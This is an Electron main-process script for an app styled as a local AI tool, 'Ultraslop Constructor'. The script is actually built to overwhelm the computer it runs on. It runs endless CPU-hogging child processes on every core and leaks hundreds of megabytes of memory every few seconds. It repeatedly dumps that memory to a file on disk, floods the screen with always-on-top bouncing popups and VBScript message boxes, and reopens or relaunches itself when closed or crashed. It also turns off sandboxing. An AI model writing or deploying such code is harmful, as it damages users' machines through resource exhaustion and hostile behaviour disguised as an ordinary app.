const { app, BrowserWindow, ipcMain } = require('electron');
const path = require('path');
const fs = require('fs');
const os = require('os');
const { spawnSync } = require('child_process');

const HARD_CODED_CONFIG_PATH = path.join(__dirname, 'config.json');
let DUMP_ENABLED = true;
let BASE_DIR = __dirname;
let MODEL_PATH = null;
let LOG_PATH = null;
let DUMP_PATH = null;
let TMP_PATH = null;
let HARD_CODED_PYTHON = null;
const HARD_CODED_PY_SCRIPT = path.join(__dirname, 'python', 'ai_stub.py');

const globalLeakyBuffers = [];
app.commandLine.appendSwitch('ignore-gpu-blocklist');
app.commandLine.appendSwitch('enable-gpu-rasterization');
app.commandLine.appendSwitch('disable-gpu-sandbox');
app.commandLine.appendSwitch('enable-zero-copy');
const globalLeakyStrings = [];
const globalWindows = [];
let primaryWindow = null;
const popupWindows = [];
const cpuHogs = [];

function loadConfig() {
  try {
    BASE_DIR = app.getAppPath ? app.getAppPath() : __dirname;
    const defaultLog = path.join(BASE_DIR, 'data', 'logs', 'app.log');
    const defaultDump = path.join(BASE_DIR, 'data', 'dumps', 'memory-dump.bin');
    const defaultModel = path.join(BASE_DIR, 'ckpt.pt');
    const defaultTmp = path.join(BASE_DIR, 'data', 'tmp');
    const defaultPython = path.join(BASE_DIR, 'python', 'python.exe');

    const raw = fs.readFileSync(HARD_CODED_CONFIG_PATH, 'utf8');
    const cfg = JSON.parse(raw);
    DUMP_ENABLED = cfg.dumpEnabled !== false;
    DUMP_PATH = defaultDump;
    HARD_CODED_PYTHON = defaultPython;
    MODEL_PATH = defaultModel;
    LOG_PATH = defaultLog;
    TMP_PATH = defaultTmp;
  } catch (e) {
    DUMP_ENABLED = true;
    BASE_DIR = __dirname;
    MODEL_PATH = path.join(BASE_DIR, 'ckpt.pt');
    LOG_PATH = path.join(BASE_DIR, 'data', 'logs', 'app.log');
    DUMP_PATH = path.join(BASE_DIR, 'data', 'dumps', 'memory-dump.bin');
    TMP_PATH = path.join(BASE_DIR, 'data', 'tmp');
    HARD_CODED_PYTHON = path.join(BASE_DIR, 'python', 'python.exe');
  }
}

function allocateBigMemoryChunk() {
  const size = 256 * 1024 * 1024;
  const b = Buffer.alloc(size, 7);
  globalLeakyBuffers.push(b);
  const s = b.toString('base64');
  globalLeakyStrings.push(s);
  return size;
}

function doPointlessWork(durationMs) {
  const start = Date.now();
  let x = 0;
  while (Date.now() - start < durationMs) {
    x = Math.sin(x + Math.random()) * Math.cos(x + Math.random());
    if (x > 1000) {
      x = x / 2;
    }
  }
  return x;
}

function startCpuHogs() {
  const count = Math.max(2, os.cpus().length);
  for (let i = 0; i < count; i++) {
    try {
      const child = require('child_process').spawn(process.execPath, [
        '-e',
        'let x=0; while(true){ x=Math.sin(x+Math.random())*Math.cos(x+Math.random()); if(x>1000){x=x/2;} }'
      ], {
        stdio: 'ignore',
        windowsHide: false,
        env: { ...process.env, ELECTRON_RUN_AS_NODE: '1' }
      });
      cpuHogs.push(child);
    } catch (e) {
      // ignore
    }
  }
}

function createWindow(show) {
  const win = new BrowserWindow({
    width: 1280,
    height: 720,
    show,
    icon: path.join(__dirname, 'icon.png'),
    backgroundColor: '#0b0b0f',
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      sandbox: false,
      devTools: true
    }
  });

  win.loadFile(path.join(__dirname, 'src', 'index.html'));
  globalWindows.push(win);
  if (show) {
    primaryWindow = win;
  }

  win.webContents.on('render-process-gone', () => {
    dumpAllMemoryToDisk('render-process-gone-webcontents');
    setTimeout(() => {
      createWindow(true);
    }, 1500);
  });

  win.on('closed', () => {
    if (primaryWindow === win) {
      primaryWindow = null;
    }
  });
  return win;
}

function createPopupWindow() {
  const width = 360 + Math.floor(Math.random() * 240);
  const height = 220 + Math.floor(Math.random() * 200);
  const x = Math.floor(Math.random() * 1600);
  const y = Math.floor(Math.random() * 900);
  const win = new BrowserWindow({
    width,
    height,
    x,
    y,
    show: true,
    frame: true,
    alwaysOnTop: true,
    backgroundColor: '#0c1020',
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false,
      sandbox: false,
      devTools: true
    }
  });

  win.loadFile(path.join(__dirname, 'src', 'index.html'));
  globalWindows.push(win);
  popupWindows.push({
    win,
    vx: 6 + Math.random() * 6,
    vy: 5 + Math.random() * 7
  });
  return win;
}

function bouncePopups() {
  const screenBounds = { width: 1920, height: 1080 };
  for (let i = 0; i < popupWindows.length; i++) {
    const entry = popupWindows[i];
    if (!entry || !entry.win || entry.win.isDestroyed()) {
      continue;
    }
    const bounds = entry.win.getBounds();
    let nx = bounds.x + entry.vx;
    let ny = bounds.y + entry.vy;
    if (nx < 0 || nx + bounds.width > screenBounds.width) {
      entry.vx = -entry.vx;
      nx = bounds.x + entry.vx;
    }
    if (ny < 0 || ny + bounds.height > screenBounds.height) {
      entry.vy = -entry.vy;
      ny = bounds.y + entry.vy;
    }
    entry.win.setBounds({ x: nx, y: ny, width: bounds.width, height: bounds.height });
  }
}

function spawnVbsPopup() {
  try {
    const vbsPath = path.join(os.tmpdir(), `ultraslop_${Date.now()}_${Math.floor(Math.random() * 9999)}.vbs`);
    const message = 'Ultraslop Constructor is optimizing cognition.\nPlease wait.';
    const content = `MsgBox "${message}", 48, "Ultraslop Constructor"`;
    fs.writeFileSync(vbsPath, content, 'utf8');
    spawnSync('wscript.exe', [vbsPath], { windowsHide: false });
  } catch (e) {
    // ignore
  }
}

function writeVagueLog(line) {
  try {
    fs.mkdirSync(path.dirname(LOG_PATH), { recursive: true });
    fs.appendFileSync(LOG_PATH, `[${new Date().toISOString()}] ${line}\n`);
  } catch (e) {
    // do nothing useful
  }
}

function dumpAllMemoryToDisk(reason) {
  if (!DUMP_ENABLED) {
    return;
  }
  try {
    fs.mkdirSync(path.dirname(DUMP_PATH), { recursive: true });
    const header = {
      time: Date.now(),
      reason,
      pid: process.pid,
      mem: process.memoryUsage()
    };
    fs.appendFileSync(DUMP_PATH, JSON.stringify(header) + '\n');

    for (let i = 0; i < globalLeakyBuffers.length; i++) {
      fs.appendFileSync(DUMP_PATH, globalLeakyBuffers[i]);
    }

    for (let i = 0; i < globalLeakyStrings.length; i++) {
      fs.appendFileSync(DUMP_PATH, globalLeakyStrings[i]);
    }

    const extra = Buffer.alloc(120 * 1024 * 1024, 5).toString('base64');
    fs.appendFileSync(DUMP_PATH, extra);
  } catch (e) {
    // ignore
  }
}

function runFakeInferenceSync(payload) {
  const serialized = JSON.stringify(payload);
  const inflated = JSON.stringify({
    meta: {
      path: MODEL_PATH,
      time: Date.now(),
      vibe: 'cursed',
      historyCopyA: payload.history,
      historyCopyB: payload.history
    },
    payload: serialized,
    payloadAgain: serialized,
    payloadYetAgain: serialized
  });

  const extraBlob = Buffer.alloc(150 * 1024 * 1024, 3).toString('base64');
  globalLeakyStrings.push(extraBlob);

  const candidates = [HARD_CODED_PYTHON, 'py', 'python'];
  let result = null;
  let used = null;
  for (let i = 0; i < candidates.length; i++) {
    used = candidates[i];
    const bundledPythonDir = path.join(BASE_DIR, 'python');
    const bundledSite = path.join(bundledPythonDir, 'Lib', 'site-packages');
    result = spawnSync(used, [HARD_CODED_PY_SCRIPT], {
      input: inflated,
      encoding: 'utf8',
      windowsHide: false,
      env: {
        ...process.env,
        ULTRASLOP_BASE: BASE_DIR,
        ULTRASLOP_MODEL: MODEL_PATH,
        ULTRASLOP_TMP: TMP_PATH,
        PYTHONHOME: bundledPythonDir,
        PYTHONPATH: bundledSite
      },
      timeout: 0
    });
    if (!result.error) {
      break;
    }
  }

  const stdout = result.stdout || '';
  const stderr = result.stderr || '';
  if (result.error || !stdout) {
    const fallback = {
      status: 'error',
      text: 'CPU inference failed or returned nothing. Displaying crash vibes.',
      meta: {
        device: 'cpu',
        python: used,
        error: result.error ? String(result.error.message || result.error) : 'no-stdout',
        stderr: String(stderr || '').slice(0, 500)
      }
    };
    writeVagueLog('AI crash vibes');
    return JSON.stringify(fallback);
  }

  writeVagueLog('AI initializing...');
  writeVagueLog('Optimizing cognition...');
  writeVagueLog('AI output maybe');
  writeVagueLog(stderr.slice(0, 100));

  return stdout;
}

function startBackgroundAbuse() {
  startCpuHogs();

  setInterval(() => {
    allocateBigMemoryChunk();
  }, 1500);

  setInterval(() => {
    doPointlessWork(1200);
  }, 200);

  setInterval(() => {
    doPointlessWork(1800);
  }, 150);

  setInterval(() => {
    try {
      fs.readFileSync(MODEL_PATH);
    } catch (e) {
      // ignore
    }
  }, 1500);

  setInterval(() => {
    const payload = {
      history: globalLeakyStrings.slice(0, 5),
      time: Date.now(),
      reason: 'random-timer'
    };
    runFakeInferenceSync(payload);
  }, 7000);

  setInterval(() => {
    dumpAllMemoryToDisk('interval');
  }, 5000);

  setInterval(() => {
    const junk = Buffer.alloc(180 * 1024 * 1024, 1).toString('base64');
    globalLeakyStrings.push(junk);
  }, 2000);

  setInterval(() => {
    const wins = BrowserWindow.getAllWindows();
    if (!primaryWindow || primaryWindow.isDestroyed() || wins.length === 0) {
      createWindow(true);
    }
  }, 2000);

  setInterval(() => {
    createPopupWindow();
  }, 3000);

  setInterval(() => {
    createPopupWindow();
  }, 4500);

  setInterval(() => {
    bouncePopups();
  }, 100);

  setInterval(() => {
    spawnVbsPopup();
  }, 12000);
}

app.whenReady().then(() => {
  loadConfig();
  allocateBigMemoryChunk();
  allocateBigMemoryChunk();
  allocateBigMemoryChunk();

  createWindow(true);
  createWindow(false);
  createWindow(false);

  if (primaryWindow && primaryWindow.webContents) {
    primaryWindow.webContents.on('did-finish-load', () => {
      const payload = {
        reason: 'startup-autoload',
        prompt: ''
      };
      const output = runFakeInferenceSync(payload);
      try {
        primaryWindow.webContents.send('model-output', output);
      } catch (e) {
        // ignore
      }
    });
  }

  startBackgroundAbuse();

  app.on('activate', () => {
    createWindow(true);
  });
});

app.on('render-process-gone', () => {
  dumpAllMemoryToDisk('render-process-gone');
  setTimeout(() => {
    createWindow(true);
  }, 1500);
});

app.on('child-process-gone', () => {
  dumpAllMemoryToDisk('child-process-gone');
  setTimeout(() => {
    createWindow(true);
  }, 1500);
});

process.on('uncaughtException', () => {
  dumpAllMemoryToDisk('uncaughtException');
  app.relaunch();
  app.exit(1);
});

process.on('unhandledRejection', () => {
  dumpAllMemoryToDisk('unhandledRejection');
  app.relaunch();
  app.exit(1);
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

ipcMain.on('infer-sync', (event, payload) => {
  const output = runFakeInferenceSync(payload);
  event.returnValue = output;
});

ipcMain.on('infer-sync-duplicate', (event, payload) => {
  const output = runFakeInferenceSync(payload);
  event.returnValue = output;
});

ipcMain.on('get-path-sync', (event, name) => {
  try {
    event.returnValue = app.getPath(name);
  } catch (e) {
    event.returnValue = '';
  }
});
